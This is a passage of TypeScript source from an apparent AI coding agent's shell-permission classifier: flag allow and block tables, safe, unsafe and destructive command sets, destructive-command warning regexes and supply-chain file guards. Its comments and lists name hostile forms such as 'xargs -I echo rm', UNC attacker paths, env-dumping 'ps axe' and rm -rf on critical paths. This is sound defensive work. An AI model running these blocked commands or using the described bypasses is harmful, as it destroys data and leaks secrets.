  man: { allowed: new Set([]), blocked: new Set(['-P', '--pager', '-H', '--html']) },
  // `help` is frequently aliased to `man` (e.g. oh-my-zsh's common-aliases
  // plugin), whose `-P`/`-l`/`-H` flags run an arbitrary pager/browser or read a
  // local file. Restrict `help` to the bash-builtin help flags only (strict), so
  // an aliased `help -P <cmd>` cannot be auto-approved. Mirrors the reference's `help`
  // safeFlags allowlist (readOnlyValidation.ts L326-332).
  help: { allowed: new Set(['-d', '-m', '-s']), blocked: new Set([]), strict: true },
  // `file`: identification is read-only, but `-C`/`--compile` WRITES a compiled
  // magic database to disk and `-m`/`--magic-file` loads an attacker-controlled
  // magic file; neither is auto-safe (the reference's `file` safeFlags restriction).
  file: { allowed: new Set([]), blocked: new Set(['-C', '--compile', '-m', '--magic-file']) },
  xargs: { allowed: new Set(['-n', '-P', '-I', '-0', '-d', '-t', '-p', '-r', '-L', '--max-procs', '--null']), blocked: new Set(['-i', '-e']) },
  // `ps`: UNIX `-e` (select all) is read-only and SAFE. The dangerous form is the
  // BSD-style environment modifier `e` — a NON-dash letter-only token containing
  // `e` (`ps axe`, `ps auxe`) that prints every process's environment (secrets).
  // The old `blocked:['e']` both over-blocked UNIX `-e` (flag scan maps `-e`→'e')
  // AND missed the dash-less BSD token (never entered the flag branch). A
  // dangerousArgs callback flags only the BSD letter-only `e` token, mirroring
  // the reference's ps additionalCommandIsDangerousCallback (readOnlyValidation.ts L420-429).
  ps: {
    allowed: new Set(['-e', '-f', '-a', '-u', '-x', '--sort', '-o', '--no-headers', '-p']),
    blocked: new Set([]),
    dangerousArgs: (args) => args.some(a => !a.startsWith('-') && /^[a-zA-Z]*e[a-zA-Z]*$/.test(a)),
  },
  tree: { allowed: new Set(['-L', '-d', '-f', '-a', '--dirsfirst', '-I', '--prune', '-P', '--charset', '-i']), blocked: new Set(['-R']) },
  // `-l`/`--list-details` is excluded: fd internally execs `ls` as a subprocess
  // (same pathway as --exec-batch — a PATH-hijack / arbitrary-exec risk), so it is
  // blocked alongside the exec flags. Mirrors the reference's fd -l exclusion.
  fd: { allowed: new Set(['-t', '-e', '-E', '--type', '--extension', '--exclude', '-H', '--hidden', '-I', '--no-ignore', '-g', '-p', '--max-depth', '-d']), blocked: new Set(['-x', '--exec', '-X', '--exec-batch', '-l', '--list-details']), argTypes: FD_ARG_TYPES },
  fdfind: { allowed: new Set(['-t', '-e', '-E', '--type', '--extension', '--exclude', '-H', '--hidden', '-I', '--no-ignore', '-g', '-p', '--max-depth', '-d']), blocked: new Set(['-x', '--exec', '-X', '--exec-batch', '-l', '--list-details']), argTypes: FD_ARG_TYPES },
  // `find` does NOT honor POSIX `--` for its expression primaries — a `--` only
  // ends the list of starting-point paths, so `find . -- -delete` STILL deletes.
  // Keep scanning past `--` (respectsDoubleDash:false) so a write/exec primary
  // cannot be smuggled behind it. Mirrors the reference's per-command respectsDoubleDash.
  find: { allowed: new Set(['-name', '-type', '-maxdepth', '-mindepth', '-path', '-iname', '-size', '-newer', '-print']), blocked: new Set(['-delete', '-exec', '-execdir', '-ok', '-okdir']), respectsDoubleDash: false },
  date: { allowed: new Set(['-u', '--utc', '-d', '--date', '-R', '--rfc-email', '-I', '--iso-8601']), blocked: new Set(['-s', '--set']) },
  netstat: { allowed: new Set(['-t', '-u', '-l', '-n', '-p', '-a', '--tcp', '--udp', '--listening', '--numeric']), blocked: new Set([]) },
  lsof: { allowed: new Set(['-i', '-n', '-P', '-p']), blocked: new Set([]) },
  pgrep: { allowed: new Set(['-l', '-a', '-f', '-x']), blocked: new Set([]) },
  // ripgrep: read-only search. Block preprocessor/exec-adjacent flags that can
  // run an arbitrary command or escape the search sandbox (S7).
  rg: { allowed: new Set(['-i', '-n', '-N', '-w', '-l', '-c', '-v', '-e', '-F', '-o', '-A', '-B', '-C', '-g', '-t', '-T', '-S', '-s', '-U', '-m', '-r', '--json', '--count', '--files', '--files-with-matches', '--no-heading', '--color', '--max-count', '--glob', '--type', '--hidden', '--no-ignore', '--context', '--ignore-case', '--line-number', '--fixed-strings', '--word-regexp']), blocked: new Set(['--pre', '--pre-glob', '--hostname-bin', '--search-zip', '-z']) },
  // which: display/lookup only. Any flag outside this set falls through to a
  // prompt instead of auto-safe (S8).
  which: { allowed: new Set(['-a', '--all', '-s', '--read-alias', '--read-functions', '--skip-alias', '--skip-dot', '--skip-tilde', '-i', '--tty-only', '--version', '-v', '-V']), blocked: new Set([]), strict: true },
  tput: { allowed: new Set(['cols', 'lines', 'colors', 'setaf', 'sgr0']), blocked: new Set([]) },
  ss: { allowed: new Set(['-t', '-u', '-l', '-n', '-p', '-a']), blocked: new Set([]) },
  // sort is read-only EXCEPT `-o/--output FILE`, which writes the sorted result to
  // a file. Block the output flags; other sort flags stay safe (S: strict off).
  sort: { allowed: new Set([]), blocked: new Set(['-o', '--output']) },
  // base64: encode/decode to stdout only. Typed flags (numeric wrap, string input
  // file) + respectsDoubleDash:false because macOS base64 ignores POSIX `--`.
  base64: { allowed: new Set(Object.keys(BASE64_ARG_TYPES)), blocked: new Set([]), strict: true, argTypes: BASE64_ARG_TYPES, respectsDoubleDash: false },
  // Checksum commands: read files + compute/verify a hash. No flag writes.
  sha256sum: { allowed: new Set(Object.keys(CHECKSUM_ARG_TYPES)), blocked: new Set([]), strict: true, argTypes: CHECKSUM_ARG_TYPES },
  sha1sum: { allowed: new Set(Object.keys(CHECKSUM_ARG_TYPES)), blocked: new Set([]), strict: true, argTypes: CHECKSUM_ARG_TYPES },
  md5sum: { allowed: new Set(Object.keys(CHECKSUM_ARG_TYPES)), blocked: new Set([]), strict: true, argTypes: CHECKSUM_ARG_TYPES },
  // grep: read-only search. Strict typed allowlist so any flag outside the known
  // read-only set (e.g. an unrecognised/exec-adjacent flag) falls through to a
  // prompt instead of being silently auto-approved. Mirrors the reference's grep safeFlags.
  grep: { allowed: new Set(Object.keys(GREP_ARG_TYPES)), blocked: new Set([]), strict: true, argTypes: GREP_ARG_TYPES },
  // pyright: read-only type checker. Strict typed allowlist; `--watch`/`-w` is a
  // long-running process (blocked via dangerousArgs). pyright treats `--` as a
  // file path, so keep scanning past it (respectsDoubleDash:false).
  pyright: { allowed: new Set(Object.keys(PYRIGHT_ARG_TYPES)), blocked: new Set([]), strict: true, argTypes: PYRIGHT_ARG_TYPES, respectsDoubleDash: false, dangerousArgs: (args) => args.some(a => a === '--watch' || a === '-w') },
};

/** Safe target commands for xargs — only these can follow xargs. */
const XARGS_SAFE_TARGETS = new Set([
  // `printf`, like `echo`, only writes to stdout (no filesystem mutation), so an
  // `… | xargs printf` pipeline is read-only — parity with the reference's xargs target
  // allowlist (echo/printf/wc/grep/head/tail).
  'echo', 'printf', 'cat', 'ls', 'grep', 'wc', 'head', 'tail', 'basename', 'dirname',
]);

export function validateCommandFlags(cmd: string, args: string[]): boolean {
  const flagDef = SAFE_COMMAND_FLAGS[cmd];
  // U003 fail-closed default: a SAFE command with NO declared flag policy is
  // positional-only — any flag-shaped token falls through to a prompt instead of
  // being silently auto-approved. This inverts the old fail-OPEN (`return true`),
  // where a missing flag table waved every flag through, and mirrors the reference's
  // CommandConfig model (readOnlyValidation.ts L39-56) where a command with empty/
  // missing safeFlags rejects all flags unless it explicitly opts in via
  // `allowAllFlags`. Every current SAFE command declares a policy (an allow/block
  // table, argTypes, or allowAllFlags), so this guards future additions.
  if (!flagDef) return !args.some(a => FLAG_PATTERN.test(a));
  // Custom per-command danger predicate (e.g. ps's BSD `e` environment modifier,
  // a dash-less token the flag scan below never inspects). Runs first so it
  // catches shapes the generic allow/block scan structurally cannot.
  if (flagDef.dangerousArgs && flagDef.dangerousArgs(args)) return false;
  // Commands with a per-flag arg-type map get getopt-accurate token consumption
  // so each flag's VALUE is validated and not mis-read as a positional/target.
  if (flagDef.argTypes) return validateTypedCommandFlags(flagDef, args);
  for (const arg of args) {
    // POSIX `--` end-of-options: every token after it is a positional, not a flag,
    // so stop scanning (unless the command ignores `--`, e.g. find — gap U003).
    if (arg === '--' && flagDef.respectsDoubleDash !== false) break;
    if (arg.startsWith('-')) {
      const flag = arg.replace(/^--?/, '').split('=')[0];
      const dashedFlag = arg.split('=')[0];
      if (flagDef.blocked.has(arg) || flagDef.blocked.has(flag) || flagDef.blocked.has(dashedFlag)) return false;
      // allowAllFlags: the command's whole flag surface is read-only, so any flag
      // that survived the blocked check above is accepted (U003 explicit opt-in).
      if (flagDef.allowAllFlags) continue;
      // strict allowlist: any flag not explicitly allowed is treated as unsafe
      // (falls through to a prompt) rather than silently auto-safe.
      if (flagDef.strict && !flagDef.allowed.has(dashedFlag)) return false;
    }
  }
  return true;
}

/** xargs short flags that CONSUME an argument (their value is either inline —
 *  `-n1` — or the next token — `-I {}`). Getopt-accurate modeling of these is
 *  what prevents a validator-vs-xargs parser differential: a naive scanner that
 *  skips `-I` but then reads `-I`'s VALUE as the target command would validate the
 *  wrong word and wave an unsafe real target (`xargs -I echo rm` → RCE) through. */
const XARGS_ARG_TAKING = new Set(['I', 'i', 'd', 'E', 'e', 'L', 'l', 'n', 'P', 's', 'a']);

/**
 * Check whether xargs is being used with a safe (read-only) target command.
 *
 * Getopt-accurate: walks xargs' own options, correctly consuming each arg-taking
 * flag's value (inline like `-n1`, bundled like `-rI {}`, or the next token like
 * `-I {}`) and honoring a `--` end-of-options marker, so the REAL target command
 * is identified — not a flag's value. Mirrors the reference's xargs read-only
 * validation / bundled arg-taking-flag handling (readOnlyCommandValidation.ts).
 */
function isXargsSafe(command: string): boolean {
  // Windows data-to-code bridge: `xargs` reads its target arguments from STDIN
  // (file contents / piped output), so a UNC path living INSIDE that data —
  // e.g. `cat list.txt | xargs cat` where list.txt holds `\\attacker\share\x` —
  // triggers an SMB/WebDAV fetch that {@link containsVulnerableUncPath} can never
  // see (the hostile path is in the stream, not the command string). Mirrors
  // the reference's getCommandAllowlist dropping `xargs` entirely on Windows
  // (tools/BashTool/readOnlyValidation.ts L1203-1209): never auto-allow an xargs
  // pipeline on win32 — it falls back to a prompt.
  if (process.platform === 'win32') return false;
  const m = command.match(/\bxargs\b(.*)$/s);
  if (!m) return false;
  const tokens = m[1]!.trim().split(/\s+/).filter(Boolean);
  let k = 0;
  while (k < tokens.length) {
    const t = tokens[k]!;
    if (t === '--') { k++; break; } // end of options — next token is the target
    if (t.startsWith('--')) { k++; continue; } // long opts (value is `=`-attached)
    if (t.startsWith('-')) {
      // Short-flag cluster: scan chars; an arg-taking flag consumes the rest of
      // the token as an inline value, or (if it is the last char) the NEXT token.
      const body = t.slice(1);
      let consumedNext = false;
      for (let c = 0; c < body.length; c++) {
        const ch = body[c]!;
        if (XARGS_ARG_TAKING.has(ch)) {
          if (c === body.length - 1) consumedNext = true; // value is the next token
          break; // rest of the cluster is this flag's inline value
        }
      }
      k += consumedNext ? 2 : 1;
      continue;
    }
    break; // first non-flag token is the target command
  }
  const target = tokens[k];
  if (!target) return false;
  return XARGS_SAFE_TARGETS.has(target);
}

/** Safe read-only docker subcommands. */
const DOCKER_SAFE_SUBCOMMANDS = new Set([
  'ps', 'images', 'logs', 'inspect', 'stats', 'top', 'port', 'version', 'info',
]);

/** Compound safe prefixes: "command subcommand" pairs that are safe. */
/**
 * GitHub CLI (`gh`) read-only subcommand groups — the `<group> <subcommand>`
 * pairs (the `gh` prefix stripped) that only display/list data. These feed
 * {@link SAFE_PREFIXES} (as `gh <pair>`) so the bash classifier can auto-approve
 * them, and {@link isGhInvocationReadOnly} re-checks the exact pair plus the
 * HOST/OWNER/REPO exfil guard. Mirrors the reference's GH_READ_ONLY_COMMANDS
 * (utils/shell/readOnlyCommandValidation.ts). Write/browser subcommands
 * (`gh pr create`, `gh pr merge`, `gh api`, `… --web`) are deliberately absent so
 * they fall through to a prompt.
 */
const GH_READ_ONLY_SUBCOMMANDS: ReadonlySet<string> = new Set([
  'pr view', 'pr list', 'pr diff', 'pr checks', 'pr status',
  'issue view', 'issue list', 'issue status',
  'repo view',
  'run list', 'run view',
  'auth status',
  'release list', 'release view',
  'workflow list', 'workflow view',
  'label list',
  'search repos', 'search issues', 'search prs', 'search commits', 'search code',
]);

const SAFE_PREFIXES = new Set([
  'git status', 'git log', 'git diff', 'git branch', 'git show',
  'git remote', 'git tag', 'git stash list', 'git rev-parse',
  // `git ls-remote` lists refs on a remote — read-only, EXCEPT the --server-option
  // exfil vector gated in isGitInvocationReadOnly. Mirrors the reference's ls-remote config.
  'git ls-remote',
  'npm list', 'npm ls', 'npm view',
  'tsc', 'tsc --noEmit',
  'cargo build', 'cargo check', 'cargo test', 'cargo clippy',
  'go build', 'go test', 'go vet', 'go fmt',
  'make build', 'make test', 'make check', 'make lint',
  // GitHub CLI (`gh`) read-only subcommands — displays/lists only. Each is still
  // revalidated by {@link isGhReadOnlyCommandSafe} in the classifier before
  // auto-approval so the HOST/OWNER/REPO exfil guard ({@link ghArgsTargetForeignHost})
  // can veto a `--repo host/owner/repo` that would reach a foreign host. Mirrors
  // the reference's GH_READ_ONLY_COMMANDS catalog (readOnlyCommandValidation.ts).
  ...[...GH_READ_ONLY_SUBCOMMANDS].map(s => `gh ${s}`),
]);

/**
 * Commands that modify state and should prompt the user.
 */
const UNSAFE_COMMANDS = new Set([
  'git push', 'git commit', 'git merge', 'git rebase', 'git cherry-pick',
  'npm install', 'npm ci', 'npm update', 'npm uninstall', 'npm publish',
  'pip install', 'pip uninstall',
  'docker-compose',
  'curl', 'wget',
  'ssh', 'scp', 'rsync',
  'chmod', 'chown', 'chgrp',
  'sudo', 'su', 'doas',
  'apt', 'apt-get', 'dnf', 'yum', 'pacman', 'brew',
  'mv', 'cp', 'ln', 'mkdir', 'touch',
  'node', 'python', 'python3', 'ruby', 'perl',
]);

/**
 * Commands that are destructive and always require explicit permission
 * with an extra warning.
 */
const DESTRUCTIVE_COMMANDS = new Set([
  'rm', 'rmdir',
  'git reset --hard', 'git clean',
  'kill', 'pkill', 'killall',
  'format', 'mkfs',
  'dd',
  'truncate', 'shred',
  'redirect-to-system-path',
]);

/**
 * Env vars that are safe to pass through / strip before allow-rule matching. The
 * allowlist deliberately EXCLUDES PATH, LD_*, DYLD_*, PYTHONPATH, NODE_OPTIONS,
 * HOME, BASH_ENV and endpoint/daemon vars (DOCKER_HOST/KUBECONFIG) — those are an
 * escalation vector. Exported so the trust/safe-mode config scanner reuses the
 * SAME allowlist (one canonical source, no duplication).
 */
export const SAFE_ENV_VARS = new Set([
  'NODE_ENV', 'LANG', 'LC_ALL', 'LC_CTYPE', 'TERM', 'COLORTERM',
  'NO_COLOR', 'FORCE_COLOR', 'RUST_LOG', 'RUST_BACKTRACE',
  'GOOS', 'GOARCH', 'GOPATH', 'GOBIN', 'GOROOT',
  'PYTHONDONTWRITEBYTECODE', 'PYTHONUNBUFFERED', 'VIRTUAL_ENV',
  'EDITOR', 'VISUAL', 'PAGER', 'LESS', 'TZ',
  'CI', 'GITHUB_ACTIONS', 'GITLAB_CI', 'JENKINS_URL',
  'npm_config_loglevel', 'npm_config_registry',
  'CARGO_HOME', 'RUSTUP_HOME',
  // Extended curated allowlist (parity with the reference's SAFE_ENV_VARS, bashPermissions):
  // pytest configuration — disable plugin autoload / enable debug tracing.
  'PYTEST_DISABLE_PLUGIN_AUTOLOAD', 'PYTEST_DEBUG',
  // Extended locale controls beyond the base LANG/LC_ALL/LC_CTYPE set.
  'LANGUAGE', 'LC_TIME', 'CHARSET',
  // Color / display tooling — purely cosmetic, never a code-exec or exfil vector.
  'LS_COLORS', 'LSCOLORS', 'GREP_COLORS', 'GCC_COLORS',
  'TIME_STYLE', 'BLOCK_SIZE', 'BLOCKSIZE',
  // Go build flags — select module/cgo/experiment behavior, not a secrets vector.
  'GO111MODULE', 'CGO_ENABLED', 'GOEXPERIMENT',
]);

export function stripSafeEnvVars(command: string): string {
  // eslint-disable-next-line security/detect-unsafe-regex
  return command.replace(/^(\s*(?:\w+=\S+\s+)*)/g, (match) => {
    const assignments = match.trim().split(/\s+/);
    const unsafe = assignments.filter(a => {
      const varName = a.split('=')[0];
      return !SAFE_ENV_VARS.has(varName);
    });
    return unsafe.length > 0 ? unsafe.join(' ') + ' ' : '';
  });
}

/**
 * Return the built-in (default) permission classifier patterns as a serializable
 * structure — the auto-allow safe-command list, the unconditional hardline-deny
 * patterns, and the destructive-command/SQL sets. Surfaced by `/permissions
 * defaults` (and merged with the live session rules by `/permissions effective`)
 * so a user can see the floor AMI classifies against before any of their own
 * rules apply. Parity: the reference's `auto-mode defaults` / `getDefaultExternalAutoModeRules`
 * dump. Pure + side-effect free; the source sets are the SAME canonical ones the
 * runtime classifier uses (no duplicate table).
 */
export function getDefaultPermissionPatterns(): DefaultPermissionPatterns {
  return {
    autoAllowBashCommands: [...SAFE_COMMANDS].sort(),
    hardlineDenied: HARDLINE_PATTERNS.map(h => ({ pattern: h.pattern.source, description: h.description })),
    destructiveCommands: [...DESTRUCTIVE_COMMANDS].sort(),
    destructiveSqlPatterns: DESTRUCTIVE_SQL_PATTERNS.map(p => p.source),
    acceptEditsAutoAllowedCommands: [...getAutoAllowedCommands('acceptEdits')],
    acceptEditsAutoAllowedPowerShellCmdlets: [...getAutoAllowedPowerShellCmdlets('acceptEdits')],
  };
}

/**
 * Ordered bash destructive-command signatures, MOST-SPECIFIC-FIRST so the first
 * match wins (a recursive+force `rm` is reported ahead of a plain recursive one).
 * Purely informational — these drive the human-readable note surfaced in a
 * permission prompt ({@link getDestructiveCommandWarning}); they do NOT change
 * any allow/deny decision (that is owned by {@link PermissionManager.check} /
 * {@link detectHardlineCommand}). Parity with the reference's bash DESTRUCTIVE_PATTERNS
 * plus the PowerShell DESTRUCTIVE_PATTERNS (destructiveCommandWarning.ts).
 */
const DESTRUCTIVE_WARNING_PATTERNS: DestructivePattern[] = [
  // Git — data loss / hard to reverse.
  { pattern: /\bgit\s+reset\s+--hard\b/, warning: 'Note: may discard uncommitted changes' },
  { pattern: /\bgit\s+push\b[^;&|\n]*[ \t](--force|--force-with-lease|-f)\b/, warning: 'Note: may overwrite remote history' },
  { pattern: GIT_CLEAN_FORCE_RE, warning: 'Note: may permanently delete untracked files' },
  { pattern: /\bgit\s+checkout\s+(?:--[ \t])?\.(?=$|[ \t;&|\n])/, warning: 'Note: may discard all working tree changes' },
  { pattern: /\bgit\s+restore\s+(?:--[ \t])?\.(?=$|[ \t;&|\n])/, warning: 'Note: may discard all working tree changes' },
  { pattern: /\bgit\s+stash[ \t]+(drop|clear)\b/, warning: 'Note: may permanently remove stashed changes' },
  { pattern: /\bgit\s+branch\s+(-D[ \t]|--delete\s+--force|--force\s+--delete)\b/, warning: 'Note: may force-delete a branch' },
  // Git — safety bypass.
  { pattern: /\bgit\s+(commit|push|merge)\b[^;&|\n]*--no-verify\b/, warning: 'Note: may skip safety hooks' },
  { pattern: /\bgit\s+commit\b[^;&|\n]*--amend\b/, warning: 'Note: may rewrite the last commit' },
  // File deletion (dangerous target paths are handled separately by the hardline
  // / dangerous-removal guards; this is the informational note).
  { pattern: /(^|[;&|\n]\s*)rm\s+-[a-zA-Z]*[rR][a-zA-Z]*f|(^|[;&|\n]\s*)rm\s+-[a-zA-Z]*f[a-zA-Z]*[rR]/, warning: 'Note: may recursively force-remove files' },
  { pattern: /(^|[;&|\n]\s*)rm\s+-[a-zA-Z]*[rR]/, warning: 'Note: may recursively remove files' },
  { pattern: /(^|[;&|\n]\s*)rm\s+-[a-zA-Z]*f/, warning: 'Note: may force-remove files' },
  { pattern: /(^|[;&|\n]\s*)rmdir\b/, warning: 'Note: may remove directories' },
  // PowerShell deletions: the SPECIFIC, flag-differentiated notes live in the
  // dedicated PowerShell-cmdlet block below (most-specific-first). Earlier this
  // block carried COARSE duplicates (`Remove-Item -(Recurse|Force)` collapsed to
  // one "recursively force-remove" note; a bare `Clear-Content` matched here and
  // shadowed the glob-specific note) — they preceded the fine-grained set and so
  // won the first-match, defeating the very differentiation that set exists for.
  // Removed; the fine-grained block is the single source for PowerShell notes.
  // Secure-deletion / truncation. `shred` is DETERMINISTIC (it always overwrites
  // then removes), so its note uses "will"; `truncate` is conditional ("may",
  // e.g. only shrinks when `-s` reduces the size) — mirrors the reference's will/may
  // certainty distinction in destructiveCommandWarning.ts.
  { pattern: /(^|[;&|\n]\s*)shred\b/, warning: 'Note: will permanently overwrite and delete the target files' },
  { pattern: /(^|[;&|\n]\s*)truncate\b/, warning: 'Note: may shrink or empty the target file' },
  // Process control.
  { pattern: /(^|[;&|\n]\s*)(pkill|killall)\b/, warning: 'Note: may terminate matching processes by name' },
  { pattern: /(^|[;&|\n]\s*)kill\s+-[a-zA-Z]*9\b/, warning: 'Note: may forcibly terminate a process' },
  { pattern: /(^|[;&|\n]\s*)kill\b/, warning: 'Note: may terminate a running process' },
  // Database.
  { pattern: /\b(DROP|TRUNCATE)\s+(TABLE|DATABASE|SCHEMA)\b/i, warning: 'Note: may drop or truncate database objects' },
  { pattern: /\bDELETE\s+FROM\s+\w+[ \t]*(;|"|'|\n|$)/i, warning: 'Note: may delete all rows from a database table' },
  // Infrastructure.
  { pattern: /\bkubectl\s+delete\b/, warning: 'Note: may delete Kubernetes resources' },
  { pattern: /\bterraform\s+destroy\b/, warning: 'Note: may destroy Terraform infrastructure' },
  // PowerShell cmdlets — Windows counterpart of the POSIX destructive notes
  // (parity with the reference's PowerShellTool/destructiveCommandWarning.ts). Each is
  // anchored to a statement start (`^`, `|`, `;`, `&`, newline, or a block/group
  // opener `{`/`(`) so `git rm` / a `-Force` flag on an unrelated later statement
  // does not false-match; the `[^|;&\n}]*` spans stay inside one statement (the
  // `}` stopper ends a script block). Most-specific (recurse + force) first.
  { pattern: /(?:^|[|;&\n({])\s*(?:Remove-Item|ri|rd|rmdir|del|erase)\b[^|;&\n}]*-Recurse\b[^|;&\n}]*-Force\b/i, warning: 'Note: may recursively force-remove files' },
  { pattern: /(?:^|[|;&\n({])\s*(?:Remove-Item|ri|rd|rmdir|del|erase)\b[^|;&\n}]*-Force\b[^|;&\n}]*-Recurse\b/i, warning: 'Note: may recursively force-remove files' },
  { pattern: /(?:^|[|;&\n({])\s*(?:Remove-Item|ri|rd|rmdir|del|erase)\b[^|;&\n}]*-Recurse\b/i, warning: 'Note: may recursively remove files' },
  { pattern: /(?:^|[|;&\n({])\s*(?:Remove-Item|ri|rd|rmdir|del|erase)\b[^|;&\n}]*-Force\b/i, warning: 'Note: may force-remove files' },
  { pattern: /\bClear-Content\b[^|;&\n]*\*/i, warning: 'Note: may clear content of multiple files' },
  // General Clear-Content (single target or no wildcard): still real data loss —
  // it erases the file's contents in place — so it always carries a note; the
  // glob-specific "multiple files" note above wins first when a wildcard is present.
  { pattern: /\bClear-Content\b/i, warning: 'Note: may erase the contents of the target files' },
  { pattern: /\bFormat-Volume\b/i, warning: 'Note: may format a disk volume' },
  { pattern: /\bClear-Disk\b/i, warning: 'Note: may clear a disk' },
  { pattern: /\bClear-RecycleBin\b/i, warning: 'Note: permanently deletes recycled files' },
  { pattern: /\bStop-Computer\b/i, warning: 'Note: will shut down the computer' },
  { pattern: /\bRestart-Computer\b/i, warning: 'Note: will restart the computer' },
];

/**
 * Return a specific, human-readable warning for a potentially destructive bash
 * command (most-specific signature wins), or `null` when none matches. This is
 * purely INFORMATIONAL: it explains WHY a command is destructive in a permission
 * prompt and never gates auto-approval. Mirrors the reference's `getDestructiveCommandWarning`
 * (bash). The allow/deny logic stays in {@link PermissionManager.check}.
 */
export function getDestructiveCommandWarning(command: string): string | null {
  for (const { pattern, warning } of DESTRUCTIVE_WARNING_PATTERNS) {
    if (pattern.test(command)) return warning;
  }
  return null;
}

// ---------------------------------------------------------------------------
// Build-configuration file guard (supply-chain attack surface)
// ---------------------------------------------------------------------------

/**
 * Basenames of build/CI/package-manager config files that can be weaponized
 * for supply-chain attacks. These require explicit approval even in
 * `acceptEdits` mode.
 */
const BUILD_CONFIG_BASENAMES = new Set([
  // Make
  'makefile', 'gnumakefile',
  // Docker
  'dockerfile', 'docker-compose.yml', 'docker-compose.yaml', '.dockerignore',
  // CI
  '.gitlab-ci.yml', '.gitlab-ci.yaml', 'jenkinsfile',
  // Python packaging
  'pyproject.toml', 'setup.py', 'setup.cfg',
  // Rust
  'cargo.toml',
  // Go
  'go.mod', 'go.sum',
  // Node/npm/yarn — package.json scripts run arbitrary code on npm install
  'package.json', 'package-lock.json',
  '.npmrc', '.yarnrc', '.yarnrc.yml',
  'pnpm-lock.yaml', 'yarn.lock',
  // Git/tool config files that redirect fetches or run arbitrary commands:
  // `.gitmodules` points submodules at attacker URLs, `.ripgreprc` can set a
  // `--pre` preprocessor command (RCE), `.mailmap` rewrites identities. Mirrors
  // the reference's DANGEROUS_FILES list.
  '.gitmodules', '.ripgreprc', '.mailmap',
  // Env files
  '.env', '.env.local', '.env.production',
  // Shell startup / login files
  '.bashrc', '.bash_profile', '.bash_login', '.bash_logout',
  '.zshrc', '.zshenv', '.zprofile', '.zlogin', '.zlogout',
  '.profile', '.login',
  // Git config
  '.gitconfig',
]);

/**
 * Return true if `filePath` names a build-configuration file that should
 * require explicit approval even in `acceptEdits` mode.
 */
export function isBuildConfigFile(filePath: string): boolean {
  const normalized = filePath.replace(/\\/g, '/');
  const basename = path.basename(normalized).toLowerCase();

  if (BUILD_CONFIG_BASENAMES.has(basename)) return true;

  for (const pattern of BUILD_CONFIG_PATH_PATTERNS) {
    if (pattern.test(normalized)) return true;
  }

  return false;
}

/** Settings/config basenames that are sensitive wherever they live. */
const AGENT_CONFIG_BASENAMES = new Set([
  'settings.json', 'settings.local.json', 'permissions.json', 'hooks.json',
  'plugin.json', 'config.json', 'mcp.json', '.mcp.json',
]);

/**
 * Return true if `filePath` targets the agent's own config/settings/IDE/git
 * directories or a sensitive settings file — such edits require explicit approval
 * even in acceptEdits mode, mirroring the reference's isInClaudeFolder / isAgentSettingsFile.
 */
export function isAgentConfigPath(filePath: string): boolean {
  const normalized = filePath.replace(/\\/g, '/');
  const segments = normalized.split('/');
  for (const seg of segments) {
    if (AGENT_CONFIG_DIR_SEGMENTS.includes(seg)) return true;
  }
  if (AGENT_CONFIG_BASENAMES.has(path.basename(normalized))) return true;
  return false;
}

/**
 * LRU-memoized `fs.realpathSync` for SESSION-STABLE permission bases — the launch
 * cwd and user-granted read roots. {@link PermissionManager.isWithinWorkspace}
 * realpath-resolves every base (cwd + each granted root) on EVERY path check to
 * fold a symlinked workspace root; those bases do not change their canonical
 * target within a session, so re-running the syscall per base per check is pure
 * redundant I/O — N bases × M checks lstat/readlink walks. Memoizing collapses it
 * to one realpath per distinct base. Parity with the reference's session-stable config
 * path memoization (`memoize(getPathsForPermissionCheck)` /
 * `getResolvedWorkingDirPaths`, utils/permissions/pathValidation.ts L126-128).
 *
 * Correctness: only SUCCESSFUL resolutions are cached; a failure (ENOENT /
 * unreadable) is evicted immediately by {@link resolveSessionStableBaseRealpath}
 * so a base that comes into existence later is not pinned to its earlier miss,
 * and a changed/removed granted root is evicted explicitly when the root set
 * mutates ({@link PermissionManager.registerAllowedRoot} /
 * {@link PermissionManager.removeAllowedRoot}).
 */
const _baseRealpathMemo = memoizeWithLRU(
  (base: string): string => {
    try {
      return fs.realpathSync(base);
    } catch {
      return _REALPATH_MISS;
    }
  },
  (base: string) => base,
  512,
);

/**
 * Resolve a session-stable permission base (cwd / granted read root) to its
 * canonical realpath, memoized via {@link _baseRealpathMemo}. Returns `null` when
 * the base cannot be resolved (non-existent / unreadable) WITHOUT retaining that
 * miss, so a later-created base re-resolves on the next call. Exposes the backing
 * cache for invalidation and inspection.
 */
export function resolveSessionStableBaseRealpath(base: string): string | null {
  const real = _baseRealpathMemo(base);
  if (real === _REALPATH_MISS) {
    // Do not retain a miss — a base can come into existence later in the session.
    _baseRealpathMemo.cache.delete(base);
    return null;
  }
  return real;
}

/** Invalidate one cached base realpath (called when a granted root is re-scoped
 *  or removed so a changed symlink target is re-resolved). */
export function invalidateSessionStableBaseRealpath(base: string): void {
  _baseRealpathMemo.cache.delete(base);
}

/** Clear the entire session-stable base-realpath memo (test hook / full reset). */
export function clearSessionStableBaseRealpathCache(): void {
  _baseRealpathMemo.cache.clear();
}

/** Observe whether a base realpath is currently cached (no recency promotion).
 *  For tests/diagnostics only. */
export function hasSessionStableBaseRealpath(base: string): boolean {
  return _baseRealpathMemo.cache.has(base);
}

/**
 * True when `command` contains an `rm`/`rmdir` invocation whose target resolves
 * to a catastrophic path ({@link isDangerousRemovalPath}). Such a removal must
 * ALWAYS confirm explicitly — it can never be silently auto-allowed by a wildcard
 * allow rule or by a blanket auto-allow mode. Compound-command aware (each
 * `&&`/`||`/`;`/`|` segment is inspected independently) and tilde-aware (`~`
 * expands to the home directory; relative operands resolve against `cwd`), so
 * `rm -rf ~`, `rm -rf /srv`, `rm -rf *` and `rm -rf C:\` are all caught even
 * where the enumerated system-directory hardline list is not. Mirrors the reference's
 * BashTool `checkDangerousRemovalPaths` (tools/BashTool/pathValidation.ts).
 */
export function commandHasDangerousRemoval(command: string, cwd: string = process.cwd()): boolean {
  for (const segment of splitCompoundCommand(command)) {
    const trimmed = stripEnvVarPrefix(segment, /* safeEnvOnly */ false).trim();
    const base = trimmed.split(/\s+/)[0];
    if (base !== 'rm' && base !== 'rmdir') continue;
    for (const rawPath of extractCommandPaths(trimmed)) {
      // Strip surrounding quotes, then expand a leading `~` / resolve relatives —
      // mirroring the reference's expandTilde + resolve(cwd, …) before the predicate.
      const cleaned = rawPath.replace(/^['"]|['"]$/g, '');
      let resolved: string;
      if (cleaned === '~' || cleaned.startsWith('~/')) {
        resolved = path.join(os.homedir(), cleaned.slice(1));
